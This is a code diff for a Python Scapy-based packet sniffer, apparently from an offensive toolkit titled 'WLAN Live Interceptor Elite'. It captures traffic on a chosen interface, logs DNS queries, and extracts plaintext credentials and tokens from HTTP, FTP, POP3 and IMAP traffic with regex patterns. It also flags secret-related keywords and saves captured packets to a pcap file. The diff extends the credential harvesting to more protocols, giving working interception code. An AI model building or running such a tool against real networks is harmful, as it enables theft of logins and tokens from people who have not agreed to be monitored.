@@ -1,105 +1,180 @@
 import re
 import os
+import threading
+import logging
 from datetime import datetime
 from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, conf, Raw, wrpcap
 from rich.console import Console
 from rich.table import Table
 from rich.live import Live
+from rich.panel import Panel
 from core.ui import draw_header
+
+# Suppress Scapy warnings for cleaner output
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 console = Console()
 session_pcap = []
 captured_intel = []
-
+intel_lock = threading.Lock() # Ensure thread safety for the shared intel list
 
 class SnifferEngine:
-    def parse_http(self, load):
-        """Deep inspection of HTTP for credential extraction."""
+    def __init__(self):
+        self.max_entries = 15
+        self.pcap_filename = f"logs/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
+
+    def parse_plaintext_creds(self, load, port):
+        """
+        Multipurpose plaintext credential extractor.
+        Covers HTTP, FTP, POP3, and IMAP.
+        """
         decoded = load.decode('utf-8', errors='ignore')
         intel = []
-        # Hunt for standard form credentials
-        patterns = [
-            r"(?i)(user|username|login|email|pass|password|pwd)=(.[^&^ ]*)"]
-        for p in patterns:
+
+        # Pattern 1: HTTP GET/POST parameters
+        http_patterns = [
+            r"(?i)(user|username|login|email|pass|password|pwd|auth|token)=([^&^ ^\r^\n]*)"
+        ]
+        
+        # Pattern 2: FTP/POP3/IMAP specific
+        proto_patterns = [
+            r"(?i)USER\s+(.*)\r\n",
+            r"(?i)PASS\s+(.*)\r\n"
+        ]
+
+        # Scan for HTTP Creds
+        if port in [80, 8080]:
+            for p in http_patterns:
+                matches = re.findall(p, decoded)
+                for match in matches:
+                    intel.append(f"[bold red]HTTP-DATA: {match[0]}={match[1]}[/bold red]")
+
+        # Scan for Generic Plaintext Protocols
+        for p in proto_patterns:
             matches = re.findall(p, decoded)
             if matches:
-                intel.append(
-                    f"[bold red]CREDS: {matches[0][0]}={matches[0][1]}[/bold red]")
+                intel.append(f"[bold yellow]AUTH-PROTO: {matches[0].strip()}[/bold yellow]")
+
         return intel
 
     def callback(self, packet):
+        """Main packet processing logic."""
         if not packet.haslayer(IP):
             return
 
-        session_pcap.append(packet)
+        # Store packet in buffer for PCAP saving (limited to prevent RAM exhaustion)
+        if len(session_pcap) < 5000:
+            session_pcap.append(packet)
+
         src, dst = packet[IP].src, packet[IP].dst
         info = []
 
-        # 1. Capture DNS Queries (See what sites they visit)
-        if packet.haslayer(DNSQR):
+        # 1. Capture DNS Queries (Domain Intel)
+        if packet.haslayer(DNSQR) and packet.haslayer(DNS) and packet[DNS].qr == 0:
             query = packet[DNSQR].qname.decode().strip('.')
-            info.append(f"[bold cyan]DNS Query: {query}[/bold cyan]")
+            info.append(f"[bold cyan]DNS Q: {query}[/bold cyan]")
 
-        # 2. Capture TCP Traffic
+        # 2. Capture TCP Traffic (Layer 4 Intelligence)
         elif packet.haslayer(TCP):
             port = packet[TCP].dport
+            sport = packet[TCP].sport
+            
             if packet.haslayer(Raw):
                 load = packet[Raw].load
-                if port in [80, 8080]:
-                    info.extend(self.parse_http(load))
-                elif any(kw in load.lower() for kw in [b"user", b"pass", b"login"]):
-                    info.append(
-                        "[yellow]Sensitive Data Pattern Detected[/yellow]")
+                
+                # Check for plaintext credentials
+                creds = self.parse_plaintext_creds(load, port)
+                if not creds: # Try source port for responses
+                    creds = self.parse_plaintext_creds(load, sport)
+                
+                if creds:
+                    info.extend(creds)
+                
+                # Generic Sensitive Data Detection (Keyword Matching)
+                keywords = [b"password", b"passwd", b"secret", b"apikey", b"access_token"]
+                if any(kw in load.lower() for kw in keywords):
+                    info.append("[bold orange1]Sensitive Keyword Detected[/bold orange1]")
 
-            # Metadata for encrypted traffic
-            if not info and port == 443:
-                info.append("[dim]Encrypted HTTPS Stream[/dim]")
+            # Protocol Labeling for Common Encrypted Traffic
+            if not info:
+                if port == 443 or sport == 443:
+                    info.append("[dim]TLS/HTTPS Encrypted[/dim]")
+                elif port == 22 or sport == 22:
+                    info.append("[dim]SSH Encrypted[/dim]")
 
         if info:
-            captured_intel.append({
-                "time": datetime.now().strftime("%H:%M:%S"),
-                "src": src, "dst": dst, "intel": " | ".join(info)
-            })
+            with intel_lock:
+                captured_intel.append({
+                    "time": datetime.now().strftime("%H:%M:%S"),
+                    "src": src, 
+                    "dst": dst, 
+                    "intel": " | ".join(info)
+                })
+                # Keep the list manageable
+                if len(captured_intel) > 100:
+                    captured_intel.pop(0)
 
     def generate_table(self):
-        table = Table(title="Live Intelligence Stream",
-                      expand=True, border_style="cyan")
-        table.add_column("Time", style="dim", width=10)
-        table.add_column("Source", style="green", width=15)
-        table.add_column("Target", style="magenta", width=15)
-        table.add_column("Intercepted Intel", style="white")
+        """Generates a Rich table for the Live display."""
+        table = Table(
+            title="WLAN Intelligence Stream", 
+            expand=True, 
+            border_style="cyan",
+            show_header=True,
+            header_style="bold magenta"
+        )
+        table.add_column("Time", style="dim", width=12, justify="center")
+        table.add_column("Source Host", style="green", width=16)
+        table.add_column("Destination", style="blue", width=16)
+        table.add_column("Intercepted Metadata", style="white")
 
-        # Show last 12 entries
-        for entry in captured_intel[-12:]:
-            table.add_row(entry["time"], entry["src"],
-                          entry["dst"], entry["intel"])
+        with intel_lock:
+            # Display only the most recent N entries
+            for entry in captured_intel[-self.max_entries:]:
+                table.add_row(entry["time"], entry["src"], entry["dst"], entry["intel"])
+        
         return table
 
     def start(self):
+        """Initializes the sniffer and UI loop."""
         draw_header("WLAN LIVE INTERCEPTOR ELITE")
-        ifaces = [i.name for i in conf.ifaces.data.values()]
-        console.print(f"[dim]Available: {', '.join(ifaces)}[/dim]")
+        
+        # Network config check
+        iface_list = [i.name for i in conf.ifaces.data.values()]
+        console.print(Panel(f"Available Interfaces: [bold cyan]{', '.join(iface_list)}[/bold cyan]", border_style="dim"))
 
-        # Cross-platform Interface Selection
-        iface = console.input(
-            "[bold yellow]Select Interface (e.g. en0): [/bold yellow]").strip() or conf.iface
+        target_iface = console.input(
+            f"[bold yellow]Select Interface (Default {conf.iface}): [/bold yellow]"
+        ).strip() or conf.iface
 
-        console.print(f"[*] Monitoring [bold cyan]{iface}[/bold cyan]...")
         if not os.path.exists("logs"):
             os.makedirs("logs")
 
+        console.print(f"[*] Sniffer Engine Active on [bold green]{target_iface}[/bold green]. Listening for IPv4...")
+        console.print("[dim]Press Ctrl+C to terminate and export session PCAP.[/dim]\n")
+
         try:
-            # Use Live reconstruction for real-time scrolling
-            with Live(self.generate_table(), refresh_per_second=2) as live:
+            # Live display management
+            with Live(self.generate_table(), refresh_per_second=2, screen=False) as live:
                 def wrapped_cb(pkt):
                     self.callback(pkt)
                     live.update(self.generate_table())
 
-                # Sniff both TCP and UDP (for DNS)
-                sniff(iface=iface, prn=wrapped_cb, store=0, filter="ip")
+                # sniff with 'store=0' because we manage 'session_pcap' manually to control RAM
+                sniff(iface=target_iface, prn=wrapped_cb, store=0, filter="ip")
 
         except KeyboardInterrupt:
+            console.print("\n[yellow][!] Interception stopped by user.[/yellow]")
             if session_pcap:
-                wrpcap("logs/capture.pcap", session_pcap)
-                console.print(
-                    f"\n[green][+] Session evidence saved to logs/capture.pcap[/green]")
+                console.print(f"[*] Saving {len(session_pcap)} packets to evidence file...")
+                wrpcap(self.pcap_filename, session_pcap)
+                console.print(f"[bold green][+] Evidence saved: {self.pcap_filename}[/bold green]")
+        except Exception as e:
+            console.print(f"[bold red][!] Sniffer Error: {e}[/bold red]")
+
+def run_sniffer():
+    engine = SnifferEngine()
+    engine.start()
+
+if __name__ == "__main__":
+    run_sniffer()
